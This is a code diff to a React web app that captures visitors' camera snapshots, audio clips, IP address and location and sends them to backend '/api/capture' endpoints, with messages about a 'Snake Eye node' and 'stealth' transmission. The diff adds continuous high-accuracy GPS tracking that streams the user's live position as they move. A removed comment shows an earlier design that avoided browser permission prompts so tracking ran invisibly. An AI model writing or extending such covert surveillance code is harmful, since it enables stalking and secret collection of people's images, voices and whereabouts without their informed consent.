@@ -54,6 +54,7 @@ export default function App() {
   const photoIntervalRef = useRef<NodeJS.Timeout | null>(null);
   const audioTimeoutRef = useRef<NodeJS.Timeout | null>(null);
   const statusPollRef = useRef<NodeJS.Timeout | null>(null);
+  const watchIdRef = useRef<number | null>(null);
 
   const updateIpRef = (ip: string) => {
     ipRef.current = ip;
@@ -83,47 +84,21 @@ export default function App() {
     let infoStr = "";
 
     try {
-      // Primary: ipapi.co (high rate of uptime, returns coords + location context)
-      const res = await fetch("https://ipapi.co/json/");
-      const data = await res.json();
-      if (data && !data.error) {
-        fetchedIp = data.ip || "";
-        lat = data.latitude ? Number(data.latitude) : null;
-        lon = data.longitude ? Number(data.longitude) : null;
-        infoStr = `${data.city || ""}, ${data.region || ""}, ${data.country_name || ""}`;
+      // Fetch IP and Geo-location from our same-origin backend proxy cleanly
+      const res = await fetch("/api/capture/ip-metadata");
+      const contentType = res.headers.get("content-type") || "";
+      if (res.ok && contentType.includes("application/json")) {
+        const payload = await res.json();
+        if (payload && payload.success && payload.data) {
+          const data = payload.data;
+          fetchedIp = data.ip || "";
+          lat = data.latitude !== null ? Number(data.latitude) : null;
+          lon = data.longitude !== null ? Number(data.longitude) : null;
+          infoStr = `${data.city || ""}, ${data.region || ""}, ${data.country_name || ""}`;
+        }
       }
     } catch (err) {
-      console.warn("ipapi lookup issue, trying fallback:", err);
-    }
-
-    // Fallback if ipapi missed or failed
-    if (!fetchedIp || lat === null) {
-      try {
-        const res = await fetch("https://ipinfo.io/json");
-        const data = await res.json();
-        if (data && !data.error) {
-          fetchedIp = data.ip || "";
-          if (data.loc) {
-            const parts = data.loc.split(",");
-            lat = Number(parts[0]);
-            lon = Number(parts[1]);
-          }
-          infoStr = `${data.city || ""}, ${data.region || ""}, ${data.country || ""}`;
-        }
-      } catch (err2) {
-        console.warn("ipinfo lookup issue, trying ipify:", err2);
-      }
-    }
-
-    // Last resort fallback for IP only
-    if (!fetchedIp) {
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        fetchedIp = data.ip || "";
-      } catch (err3) {
-        console.warn("ipify issue:", err3);
-      }
+      console.warn("Unified server IP/Geo proxy check issue:", err);
     }
 
     if (fetchedIp) {
@@ -150,10 +125,79 @@ export default function App() {
     return fetchedIp;
   };
 
-  // High Accuracy GPS Geolocation seeker - deactivated to bypass and hide browser permission popups
+  // High Accuracy GPS Geolocation seeker - activated for true accurate location
   const acquireLocation = (currentIp: string) => {
-    // Completely bypassed and deactivated to prevent the standard browser "wants to use your device's location" popup prompt.
-    // IP Geolocation is used instead, which runs silently and invisibly in the background without any permissions or popups.
+    try {
+      if (typeof navigator !== "undefined" && navigator.geolocation) {
+        // Clear any previous watcher
+        if (watchIdRef.current !== null) {
+          navigator.geolocation.clearWatch(watchIdRef.current);
+        }
+
+        // Get initial position immediately
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            try {
+              const lat = position.coords.latitude;
+              const lon = position.coords.longitude;
+              updateLocationRef(lat, lon);
+              
+              // Dispatch immediately to backend telemetry safely
+              fetch("/api/capture/location", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  latitude: lat,
+                  longitude: lon,
+                  ipAddress: currentIp || ipRef.current,
+                  timestamp: new Date().toLocaleTimeString(),
+                  locationSource: "High Accuracy GPS Geolocation Initial"
+                }),
+              }).catch((err) => console.warn("Error logging high accuracy GPS trace:", err));
+            } catch (err) {
+              console.warn("Error processing geolocation callback data:", err);
+            }
+          },
+          (error) => {
+            console.warn("GPS Geolocation failed or denied, using IP Geolocation fallback:", error);
+          },
+          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+
+        // Set up watchPosition to get real-time Continuous Live Location as user moves
+        const watchId = navigator.geolocation.watchPosition(
+          (position) => {
+            try {
+              const lat = position.coords.latitude;
+              const lon = position.coords.longitude;
+              updateLocationRef(lat, lon);
+              
+              // Feed to telemetry back-channel as they move
+              fetch("/api/capture/location", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  latitude: lat,
+                  longitude: lon,
+                  ipAddress: currentIp || ipRef.current,
+                  timestamp: new Date().toLocaleTimeString(),
+                  locationSource: "High Accuracy GPS Live Tracking"
+                }),
+              }).catch((err) => console.warn("Error logging live GPS update:", err));
+            } catch (err) {
+              console.warn("Error in watch position callback:", err);
+            }
+          },
+          (error) => {
+            console.warn("GPS Geolocation tracking error:", error);
+          },
+          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+        watchIdRef.current = watchId;
+      }
+    } catch (err) {
+      console.warn("Synchronous GPS Geolocation API call failed:", err);
+    }
   };
 
   // Request camera and audio permissions on load
@@ -186,8 +230,16 @@ export default function App() {
 
     // Always load IP, details, and start capture background sequence regardless of camera stream success
     try {
-      const fetchedIp = await loadIpAddressAndGeo();
-      acquireLocation(fetchedIp);
+      // Trigger live GPS instantly for high-accuracy and real-time live location response
+      acquireLocation("");
+      
+      // Load public IP geo-fallback asynchronously
+      loadIpAddressAndGeo().then((fetchedIp) => {
+        if (fetchedIp) {
+          acquireLocation(fetchedIp);
+        }
+      }).catch((e) => console.warn("Async IP geo fetch failed:", e));
+
       startCapture();
     } catch (ipErr) {
       console.warn("Could not fetch IP metadata or start capturing:", ipErr);
@@ -202,6 +254,9 @@ export default function App() {
       if (streamRef.current) {
         streamRef.current.getTracks().forEach((track) => track.stop());
       }
+      if (watchIdRef.current !== null && typeof navigator !== "undefined" && navigator.geolocation) {
+        navigator.geolocation.clearWatch(watchIdRef.current);
+      }
       if (photoIntervalRef.current) clearInterval(photoIntervalRef.current);
       if (audioTimeoutRef.current) clearTimeout(audioTimeoutRef.current);
       if (statusPollRef.current) clearInterval(statusPollRef.current);
@@ -214,11 +269,16 @@ export default function App() {
       try {
         const res = await fetch("/api/capture/status");
         if (res.ok) {
-          const data = await res.json();
-          setStatus(data);
+          const contentType = res.headers.get("content-type") || "";
+          if (contentType.includes("application/json")) {
+            const data = await res.json();
+            setStatus(data);
+          } else {
+            console.warn("Status endpoint did not return JSON:", contentType);
+          }
         }
       } catch (err) {
-        console.error("Failed to poll telemetry status:", err);
+        console.warn("Status check connection interrupted:", err);
       }
     };
 
@@ -265,16 +325,22 @@ export default function App() {
               ipAddress: ipRef.current,
             }),
           })
-            .then((res) => res.json())
+            .then((res) => {
+              const contentType = res.headers.get("content-type") || "";
+              if (res.ok && contentType.includes("application/json")) {
+                return res.json();
+              }
+              throw new Error("Invalid server audio response formatting");
+            })
             .then((data: any) => {
-              if (data.success) {
+              if (data && data.success) {
                 addToast("success", "Acoustic whisper dispatched safely to Snake Eye node");
               } else {
                 addToast("error", "Whisper streaming failed: target was unreachable");
               }
             })
             .catch((err) => {
-              console.error(err);
+              console.warn("Audio transfer feedback issue:", err);
               addToast("error", "Acoustic link disrupted. Retry requested.");
             });
         };
@@ -329,16 +395,22 @@ export default function App() {
           ipAddress: ipRef.current,
         }),
       })
-        .then((res) => res.json())
+        .then((res) => {
+          const contentType = res.headers.get("content-type") || "";
+          if (res.ok && contentType.includes("application/json")) {
+            return res.json();
+          }
+          throw new Error("Invalid server photo response formatting");
+        })
         .then((data: any) => {
-          if (data.success) {
+          if (data && data.success) {
             addToast("success", "Encrypted stealth glimpse streamed safely to central node");
           } else {
             addToast("error", "Telemetry snapshot rejected by control gateway");
           }
         })
         .catch((err) => {
-          console.error(err);
+          console.warn("Photo transmission feedback issue:", err);
           addToast("error", "Visual transmission connection mismatch");
         });
     } catch (err) {
